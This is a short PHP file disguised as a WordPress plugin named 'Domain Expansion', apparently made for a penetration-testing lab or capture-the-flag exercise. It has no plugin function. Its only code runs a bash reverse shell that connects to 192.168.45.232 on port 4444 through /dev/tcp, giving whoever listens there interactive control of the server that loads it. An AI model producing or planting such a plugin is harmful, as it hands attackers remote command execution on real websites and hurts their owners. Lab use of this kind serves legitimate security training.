<?php
/**
* Plugin Name: Domain Expansion
* Plugin URI: https://x.com/dognamedlepton
* Description: Domain Expansion
* Version: 1.0
* Author: jckhmr
* Author URI: https://x.com/dognamedlepton
* License: https://nosuchlicense
*/

$HOST = '192.168.45.232';
$PORT = '4444';
exec("/bin/bash -c 'bash -i >& /dev/tcp/$HOST/$PORT 0>&1'");
?>
